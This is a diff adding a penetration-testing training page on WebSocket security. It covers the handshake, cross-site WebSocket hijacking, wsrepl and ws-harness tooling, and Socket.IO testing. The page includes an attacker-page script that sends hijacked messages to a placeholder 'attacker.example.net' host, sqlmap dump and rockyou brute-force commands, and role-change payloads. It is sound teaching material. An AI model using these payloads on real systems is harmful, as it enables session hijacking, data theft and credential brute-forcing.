@@ -1,0 +1,193 @@
+---
+layout: training-page
+title: "WebSocket Security — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - websockets
+  - cswsh
+  - csrf
+  - real-time
+  - fuzzing
+page_key: "web-websockets"
+---
+<h1>WebSocket Security</h1>
+<p>
+  WebSockets provide full-duplex communication over a single persistent connection, commonly used
+  in chat applications, live dashboards, gaming, and financial platforms. Unlike HTTP, WebSocket
+  connections are long-lived and bi-directional. Security testing requires different tooling and
+  techniques than standard HTTP testing — traditional scanners often miss WebSocket vulnerabilities
+  entirely.
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>doyensec/wsrepl — interactive WebSocket REPL for pentesters — <code>github.com/doyensec/wsrepl</code></li>
+  <li>PortSwigger/websocket-turbo-intruder — fuzz WebSockets with Python — <code>github.com/PortSwigger/websocket-turbo-intruder</code></li>
+  <li>snyk/socketsleuth — Burp extension for WebSocket pentesting — <code>github.com/snyk/socketsleuth</code></li>
+  <li>ws-harness.py — proxy WebSocket messages to HTTP for traditional tools</li>
+  <li>Burp Suite — intercept and replay WebSocket messages natively in Proxy tab</li>
+</ul>
+
+<h2>WebSocket Protocol</h2>
+<p>
+  WebSockets start as a standard HTTP/1.1 request. The client sends an Upgrade request; if the
+  server accepts, it responds with 101 Switching Protocols and the persistent WebSocket connection
+  is established. All subsequent messages bypass HTTP — no headers, no verbs, just raw frames.
+</p>
+
+<h3>Handshake Request</h3>
+<pre><code>GET /chat HTTP/1.1
+Host: example.com:80
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Cookie: session=abc123</code></pre>
+
+<h3>Handshake Response</h3>
+<pre><code>HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</code></pre>
+
+<p>
+  Note: the <code>Cookie</code> header in the handshake carries the user's session. If the
+  handshake is not CSRF-protected, any origin can initiate a WebSocket connection using the
+  victim's cookies — this is the Cross-Site WebSocket Hijacking attack.
+</p>
+
+<h2>Cross-Site WebSocket Hijacking (CSWSH)</h2>
+<p>
+  CSWSH occurs when a WebSocket handshake does not include a CSRF token or an origin check.
+  Browsers automatically send cookies with the handshake request, so an attacker's page can
+  open an authenticated WebSocket to the victim's application and read all messages.
+</p>
+<pre><code>&lt;!-- Attacker's page — hosted on evil.com --&gt;
+&lt;script&gt;
+  var ws = new WebSocket('wss://target.example.com/messages');
+
+  ws.onopen = function(event) {
+    // Authenticate or request sensitive data
+    ws.send("GET_USER_DATA");
+  };
+
+  ws.onmessage = function(event) {
+    // Exfiltrate all received messages to attacker server
+    fetch('https://attacker.example.net/steal?data=' + encodeURIComponent(event.data),
+          {mode: 'no-cors'});
+  };
+&lt;/script&gt;</code></pre>
+
+<p>
+  If the application uses a <code>Sec-WebSocket-Protocol</code> header in the handshake,
+  pass it as the second argument:
+</p>
+<pre><code>&lt;script&gt;
+  var ws = new WebSocket('wss://target.example.com/messages', 'chat-protocol');
+&lt;/script&gt;</code></pre>
+
+<h2>Using wsrepl for Auditing</h2>
+<p>
+  wsrepl provides an interactive terminal for sending and receiving WebSocket messages during a
+  pentest. It integrates with Burp by accepting curl-style arguments from the captured Upgrade
+  request, and supports Python plugins for automation.
+</p>
+<pre><code># Install wsrepl
+pip install wsrepl
+
+# Connect with authentication plugin
+wsrepl -u wss://target.com/ws -P auth_plugin.py
+
+# Use cookies from Burp (copy as curl, paste into wsrepl)
+wsrepl -u wss://target.com/ws \
+       -H "Cookie: session=abc123" \
+       -H "Origin: https://target.com"</code></pre>
+
+<h3>wsrepl Plugin Example</h3>
+<pre><code>from wsrepl import Plugin
+from wsrepl.WSMessage import WSMessage
+import json
+import requests
+
+class AuthPlugin(Plugin):
+    def init(self):
+        # Fetch auth token on startup
+        token = requests.get("https://target.com/api/uuid").json()["uuid"]
+        self.messages = [
+            json.dumps({"type": "auth", "sessionId": token})
+        ]
+
+    async def on_message_sent(self, message: WSMessage) -&gt; None:
+        # Wrap outgoing messages in the app's expected format
+        original = message.msg
+        message.msg = json.dumps({"type": "message", "data": {"text": original}})
+        message.short = original
+        message.long = message.msg
+
+    async def on_message_received(self, message: WSMessage) -&gt; None:
+        # Extract readable text from response frames
+        try:
+            message.short = json.loads(message.msg)["data"]["text"]
+        except Exception:
+            message.short = "Could not parse response"
+        message.long = message.msg</code></pre>
+
+<h2>Fuzzing WebSockets via HTTP Proxy (ws-harness.py)</h2>
+<p>
+  ws-harness.py acts as a bridge: it listens for HTTP requests, injects the request body into
+  a WebSocket message (replacing the <code>[FUZZ]</code> keyword), and forwards the response
+  back as HTTP. This allows standard fuzzing tools (sqlmap, ffuf, Burp Intruder) to work against
+  WebSocket endpoints.
+</p>
+<pre><code># Start the harness targeting the WebSocket endpoint:
+python ws-harness.py -u "ws://target.com/authenticate-user" -m ./message.txt</code></pre>
+
+<p>message.txt template (contains the [FUZZ] placeholder):</p>
+<pre><code>{
+    "auth_user": "dGVzdA==",
+    "auth_pass": "[FUZZ]"
+}</code></pre>
+
+<pre><code># Now run sqlmap against the harness HTTP endpoint:
+sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --tables --tamper=base64encode --dump
+
+# Or use ffuf for credential brute-force:
+ffuf -u http://127.0.0.1:8000/?fuzz=FUZZ -w /usr/share/wordlists/rockyou.txt</code></pre>
+
+<h2>SocketIO-Specific Testing</h2>
+<p>
+  Socket.IO adds its own protocol on top of WebSockets (and falls back to long-polling).
+  Messages follow a specific framing format with event names and data payloads. Intercept with
+  Burp and look for event names that can be manipulated.
+</p>
+<pre><code># Socket.IO message format (engine.io protocol):
+# Type prefixes: 0=open, 1=close, 2=ping, 3=pong, 4=message, 5=upgrade, 6=noop
+# Socket.IO message type 4 (send):
+42["event_name",{"key":"value"}]
+
+# Test for injection in event data:
+42["send_message",{"room":"admin","text":"injected"}]
+42["change_role",{"userid":"victim","role":"admin"}]</code></pre>
+
+<h2>Common Vulnerabilities to Test</h2>
+<ul>
+  <li><strong>CSWSH</strong> — missing CSRF token or origin check on handshake</li>
+  <li><strong>Injection in message body</strong> — SQL injection, XSS, command injection via WebSocket message payloads</li>
+  <li><strong>Authorization</strong> — can lower-privilege users access high-privilege WebSocket events?</li>
+  <li><strong>Message replay</strong> — can old messages be replayed to re-trigger actions?</li>
+  <li><strong>DoS via message flooding</strong> — no rate limiting on WebSocket messages</li>
+  <li><strong>Insecure protocol</strong> — using <code>ws://</code> instead of <code>wss://</code> (plaintext, MitM)</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings Web Sockets — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets</code></li>
+  <li>PortSwigger WebSocket vulnerabilities — <code>portswigger.net/web-security/websockets</code></li>
+  <li>wsrepl tool — <code>github.com/doyensec/wsrepl</code></li>
+  <li>Streamlining WebSocket Pentesting with wsrepl — Doyensec blog, July 2023</li>
+  <li>websocket-turbo-intruder — <code>github.com/PortSwigger/websocket-turbo-intruder</code></li>
+  <li>socketsleuth Burp extension — <code>github.com/snyk/socketsleuth</code></li>
+  <li>Cross Site WebSocket Hijacking with socketio — Jimmy Li, 2020</li>
+  <li>PortSwigger Labs — Cross-site WebSocket hijacking — <code>portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab</code></li>
+  <li>Root Me — Web Socket 0 protection challenge — <code>root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection</code></li>
+</ul>
